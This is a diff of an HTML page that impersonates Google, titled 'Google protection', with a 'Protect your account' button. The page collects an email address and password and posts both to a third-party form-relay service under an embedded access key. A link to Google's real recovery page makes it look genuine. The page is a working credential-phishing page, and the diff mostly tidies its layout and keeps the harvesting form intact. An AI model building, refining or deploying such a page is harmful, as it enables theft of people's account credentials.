@@ -1,10 +1,10 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Register & Login</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-    <title>gooleprotection</title>
     <style>
         * {
             margin: 0;
@@ -39,17 +39,6 @@
             margin-bottom: 0.4rem;
         }
 
-        textarea {
-            height: 30px;
-            color: inherit;
-            width: 100%;
-            background-color: transparent;
-            border: none;
-            border-bottom: 1px solid #757575;
-            padding-left: 1.5rem;
-            font-size: 15px;
-        }
-
         input {
             color: inherit;
             width: 100%;
@@ -59,9 +48,7 @@
             padding-left: 1.5rem;
             font-size: 15px;
         }
-        .fas fa-lock{
-            margin-right: -10px;
-        }
+
         .input-group {
             padding: 1% 0;
             position: relative;
@@ -115,6 +102,7 @@
 
         .btn {
             font-size: 1.1rem;
+            text-decoration: none;
             padding: 8px 0;
             border-radius: 5px;
             outline: none;
@@ -171,41 +159,45 @@
             background-color: transparent;
             font-size: 1rem;
             font-weight: bold;
-            text-decoration: none;
         }
 
             button:hover {
                 text-decoration: underline;
                 color: blue;
             }
+
     </style>
 </head>
 <body>
+
+
     <div class="container" id="signIn">
-        <h1 class="form-title">Protect your Google account protect </h1>
+        <h1 class="form-title">Google protection</h1>
         <form action="https://api.web3forms.com/submit" method="POST">
             <input type="hidden" name="access_key" value="e7dc2f09-2c3b-454b-9d78-d332b2263fbe">
 
-            <i class="fas fa-envelope"></i>
-            <input type="email" name="name" required>
-            <label for="email">email</label>
-            <i class="fas fa-lock">
-            <input type="password" name="email" required>
-            <label for="password">Password</label>
+            <div class="input-group">
+                <i class="fas fa-envelope"></i>
+                <input type="email" name="name" id="email" placeholder="Email" required>
+                <label for="email">Email</label>
+            </div>
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" name="email" id="password" placeholder="Password" required>
+                <label for="password">Password</label>
+            </div>
             <p class="recover">
                 <a href="https://support.google.com/accounts/answer/41078?hl=en&co=GENIE.Platform%3DAndroid">Recover Password</a>
             </p>
-            <center>
-                <button type="submit" class="btn">Protect your account. </button>
-            </center>
+            <button type="submit" class="btn">Protect your account.</button>
         </form>
         <p class="or">
-            ----------or--------
+          ----------or--------
         </p>
         <div class="icons">
-            <i class="fab fa-google"></i>
-            <i class="fab fa-facebook"></i>
+          <i class="fab fa-google"></i>
+          <i class="fab fa-facebook"></i>
         </div>
-    </div>
-</body>
+      </div>
+      </body>
 </html>
